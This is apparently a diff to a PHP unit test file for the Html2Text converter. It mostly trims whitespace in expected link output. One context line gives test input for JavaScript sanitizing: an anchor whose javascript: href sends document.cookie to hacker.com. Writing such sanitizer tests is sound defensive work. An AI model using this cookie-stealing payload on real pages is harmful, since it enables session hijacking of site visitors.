@@ -69,12 +69,13 @@ EOT;
 EOT;
 
         $expected =<<<EOT
-Link text 
+Link text
 
-Link text [http://example.com] 
+Link text [http://example.com]
 
 Link text
 [http://example.com]
+
 EOT;
 
         $html2text = new Html2Text($html);
@@ -124,7 +125,7 @@ EOT;
 
         $this->assertEquals($expected, $html2text->getText());
     }
-		
+
     public function testJavascriptSanitizing()
     {
         $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
